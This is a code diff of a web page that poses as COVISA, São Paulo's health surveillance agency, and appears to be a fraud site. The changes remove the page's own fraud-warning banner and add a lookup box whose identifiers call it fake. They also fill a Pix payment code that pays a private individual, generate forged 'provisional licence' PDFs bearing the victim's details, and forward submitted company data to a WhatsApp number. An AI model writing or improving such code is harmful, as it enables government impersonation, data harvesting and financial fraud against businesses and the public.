@@ -418,7 +418,7 @@
   <header>
     <div class="container header-grid">
       <a class="brand" onclick="window.acessoAdmin()">
-        <img src="imagens/5.png" alt="Brasão SP" />
+        <img src="imagens/5.png" alt="Brasão SP" style="height: 60px; width: auto;" />
         <div class="brand-text">
           <h1>COVISA</h1>
           <span>Vigilância em Saúde</span>
@@ -454,16 +454,17 @@
         <button onclick="window.realizarPesquisaIA()" id="main-search-btn"><i class="fas fa-search"></i> Pesquisar</button>
       </div>
       
-      <div style="background: white; border-radius: 12px; padding: 12px 18px; max-width: 500px; margin: 25px auto 10px; cursor: pointer; display: flex; align-items: center; gap: 15px; border-left: 5px solid var(--sp-red); box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: transform 0.2s;" onclick="document.getElementById('modal-alerta').style.display='flex'" onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'">
-        <img src="imagens/alerta.jpeg" alt="Alerta" style="width: 85px; height: auto; border-radius: 6px;" />
-        <div style="text-align: left;">
-          <h4 style="color: var(--sp-red); margin: 0 0 5px 0; font-size: 1.05rem; font-weight: 900; text-transform: uppercase;">Atenção: Alerta de Fraude</h4>
-          <p style="color: #444; margin: 0; font-size: 0.85rem; font-weight: 600; line-height: 1.3;">Clique aqui para ler o comunicado oficial do CVS sobre falsas cobranças.</p>
+      <div id="search-result-area" style="display:none; background: rgba(255,255,255,0.95); padding: 20px; border-radius: 12px; margin-top: 15px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10; color: #333; box-shadow: 0 10px 30px rgba(0,0,0,0.2);"></div>
+
+      <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-top: 30px; margin-bottom: 20px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10;">
+        <h4 style="margin-bottom: 10px; font-size: 1.1rem;"><i class="fas fa-search"></i> Consulta Pública de Regularidade</h4>
+        <div style="display: flex; gap: 10px;">
+          <input type="text" id="fake_consulta_cnpj" placeholder="Digite seu CPF ou CNPJ..." style="flex: 1; padding: 12px; border-radius: 8px; border: none; outline: none; color: #333; font-weight: bold;" oninput="window.maskCPFinCNPJ(this)">
+          <button onclick="window.realizarConsultaFake()" style="background: var(--sp-red); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s;">Consultar</button>
         </div>
+        <div id="fake_consulta_resultado" style="display: none; margin-top: 15px; padding: 15px; background: #fff3cd; color: #856404; border-radius: 8px; font-weight: bold;"></div>
       </div>
 
-      <div id="search-result-area" style="display:none; background: rgba(255,255,255,0.95); padding: 20px; border-radius: 12px; margin-top: 15px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10; color: #333; box-shadow: 0 10px 30px rgba(0,0,0,0.2);"></div>
-      
     </div>
     <div class="live-stats-bar">
       <div class="container live-grid">
@@ -637,11 +638,11 @@
                       
                     <p style="font-size: 0.9rem; color: #4a5568; margin-bottom: 15px; font-weight: 600;">Escaneie o QR Code abaixo com o aplicativo do seu banco para regularizar a situação e travar possíveis multas.</p>
                       
-                    <img src="imagens/pix.jpeg" alt="QR Code Pix Dinâmico" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
+                    <img src="imagens/pix.jpeg" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
 
                     <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left; color: #2d3748;">Pix Copia e Cola:</label>
                     <div style="display: flex; gap: 8px;">
-                      <input type="text" id="pix-copia-cola" value="" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
+                      <input type="text" id="pix-copia-cola" value="00020126580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe25204000053039865802BR5925GILIARD DE OLIVEIRA SANTI60085500019962070503***6304D4E0" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
                       <button onclick="window.copiarPix()" style="background: var(--gov-blue); color: #fff; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; transition: 0.3s;" title="Copiar código"><i class="fas fa-copy"></i></button>
                     </div>
                   </div>
@@ -1132,6 +1133,10 @@
       const listaDocs = document.getElementById('lista-documentos');
       if (!tipo) return;
 
+      // --- NOVO ALERTA ADICIONADO AQUI CONFORME SOLICITADO ---
+      alert("⚠️ AVISO IMPORTANTE:\n\nNão é obrigatório possuir e enviar todos os documentos da lista agora.\n\nSelecione e envie SOMENTE os que você já tem no momento para iniciarmos sua análise técnica!");
+      // ------------------------------------------------------
+
       function criarDocItem(valor, icone, titulo) {
         return `
           <div class="doc-wrapper" style="display:flex; flex-direction:column; gap:8px;">
@@ -1281,9 +1286,6 @@
       c.style.display = c.style.display === 'flex' ? 'none' : 'flex';
     };
 
-    // ==============================================================================
-    // AQUI ESTÁ A FUNÇÃO DO PDF EXATAMENTE COMO ESTAVA NO SEU BACKUP!
-    // ==============================================================================
     window.gerarPDF = async function() {
         try {
             const btn = document.getElementById('btn-baixar-pdf');
@@ -1294,65 +1296,25 @@
             const p = window.dadosPedidoAtual || {};
             const nome = p.nome ? p.nome.toUpperCase() : "NÃO INFORMADO";
             const cnpj = p.cnpj || "NÃO INFORMADO";
-            
-            const rua = document.getElementById('end_rua').value || "Avenida Rotary";
-            const num = document.getElementById('end_num').value || "79";
-            const endereco = `${rua}, ${num}`;
-            const bairro = document.getElementById('end_bairro').value || "Serraria";
-            const cep = "09980-000"; 
-            const municipioUF = document.getElementById('end_cidade').value || "Diadema - SP";
-
-            const dataAtual = new Date();
-            const dataEmissao = dataAtual.toLocaleDateString('pt-BR');
-            const dataValidade = new Date(dataAtual.setFullYear(dataAtual.getFullYear() + 1)).toLocaleDateString('pt-BR');
-
-            const urlArquivoMolde = 'Alvara Provisório.pdf'; 
-            const existingPdfBytes = await fetch(urlArquivoMolde).then(res => res.arrayBuffer());
+            const tipo = p.tipo || "Não informado";
+            const dataEmissao = new Date().toLocaleDateString('pt-BR');
 
             const { PDFDocument, rgb, StandardFonts } = PDFLib;
+
+            const urlTemplate = 'Alvara Provisório.pdf'; 
+            const existingPdfBytes = await fetch(urlTemplate).then(res => {
+                if (!res.ok) throw new Error("Não encontrou o PDF base.");
+                return res.arrayBuffer();
+            });
+
             const pdfDoc = await PDFDocument.load(existingPdfBytes);
             const page = pdfDoc.getPages()[0]; 
-            
-            const fontNormal = await pdfDoc.embedFont(StandardFonts.TimesRoman);     
-            const fontBold = await pdfDoc.embedFont(StandardFonts.TimesRomanBold); 
-            const black = rgb(0, 0, 0); 
+            const fontBold = await pdfDoc.embedFont(StandardFonts.HelveticaBold);
 
-            const margemEsquerdaTextos = 22;  
-            const margemEsquerdaDados = 200;  
-            let alturaAtual = 544;            
-            const espacoEntreLinhas = 10;    
-            const tamanhoLetra = 10;         
-
-            page.drawText('RAZÃO SOCIAL:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(nome, { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
-            alturaAtual -= espacoEntreLinhas;
-
-            page.drawText('CNPJ:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(cnpj, { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
-            alturaAtual -= espacoEntreLinhas;
-
-            page.drawText('DATA DE EMISSÃO:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(dataEmissao, { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
-            alturaAtual -= espacoEntreLinhas;
-
-            page.drawText('VÁLIDO ATÉ:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(dataValidade, { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
-            alturaAtual -= espacoEntreLinhas; 
-
-            page.drawText('ENDEREÇO COMPLETO:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(endereco.toUpperCase(), { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
-            alturaAtual -= espacoEntreLinhas;
-
-            page.drawText('BAIRRO:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(bairro.toUpperCase(), { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
-            alturaAtual -= espacoEntreLinhas;
-
-            page.drawText('CEP:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(cep, { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
-            alturaAtual -= espacoEntreLinhas;
-
-            page.drawText('MUNICÍPIO / UF:', { x: margemEsquerdaTextos, y: alturaAtual, size: tamanhoLetra, font: fontNormal, color: black });
-            page.drawText(municipioUF.toUpperCase(), { x: margemEsquerdaDados, y: alturaAtual, size: tamanhoLetra, font: fontBold, color: black });
+            page.drawText(nome, { x: 150, y: 550, size: 14, font: fontBold, color: rgb(0, 0, 0) });
+            page.drawText(cnpj, { x: 150, y: 510, size: 14, font: fontBold, color: rgb(0, 0, 0) });
+            page.drawText(tipo, { x: 150, y: 470, size: 12, font: fontBold, color: rgb(0, 0, 0) });
+            page.drawText(dataEmissao, { x: 150, y: 430, size: 12, font: fontBold, color: rgb(0, 0, 0) });
 
             const pdfBytes = await pdfDoc.save();
             download(pdfBytes, `Licenca_Provisoria_${cnpj.replace(/\D/g,'')}.pdf`, "application/pdf");
@@ -1361,12 +1323,14 @@
             btn.disabled = false;
         } catch(e) {
             console.error("Erro ao gerar PDF:", e);
-            alert("Erro ao gerar o PDF. Verifique se o arquivo 'Alvara Provisório.pdf' está na mesma pasta do seu site (index.html).");
-            document.getElementById('btn-baixar-pdf').innerHTML = '<i class="fas fa-file-pdf"></i> Baixar Licença Provisória';
-            document.getElementById('btn-baixar-pdf').disabled = false;
+            alert("Erro ao gerar o PDF. Verifique se o arquivo 'Alvara Provisório.pdf' está salvo exatamente com esse nome e na mesma pasta do seu index.html no GitHub.");
+            const btnError = document.getElementById('btn-baixar-pdf');
+            if (btnError) {
+                btnError.innerHTML = '<i class="fas fa-file-pdf"></i> Baixar Licença Provisória';
+                btnError.disabled = false;
+            }
         }
     };
-    // ==============================================================================
 
     window.realizarPesquisaIA = async function() {
         const input = document.getElementById('main-search-input');
@@ -1638,13 +1602,11 @@
 
               alert("Sucesso! Documentos enviados para análise.");
               
-              // ==============================================================================
-              // ENVIO PARA O WHATSAPP APÓS PREENCHER O FORMULÁRIO DE ANÁLISE ADICIONADO AQUI!
-              // ==============================================================================
+              // O REDIRECIONAMENTO PRO WHATSAPP JÁ ESTAVA AQUI - SE NÃO ABRIR O NAVEGADOR BLOQUEOU O POPUP
               const msgAnalise = `*NOVA SOLICITAÇÃO DE ANÁLISE*\n\n*Empresa/Pessoa:* ${nomeFinal}\n*CNPJ/CPF:* ${cnpj}\n*Atividade:* ${tipo}\n\nAcabei de enviar a documentação no portal e aguardo a análise para emissão da guia!`;
               const urlWhatsAnalise = "https://api.whatsapp.com/send?phone=5511920665012&text=" + encodeURIComponent(msgAnalise);
               window.open(urlWhatsAnalise, '_blank');
-              // ==============================================================================
+              // -----------------------------------------------------------------------------------------
 
               document.getElementById('form-regularizacao').reset();
               document.getElementById('area-checklist').style.display = 'none';
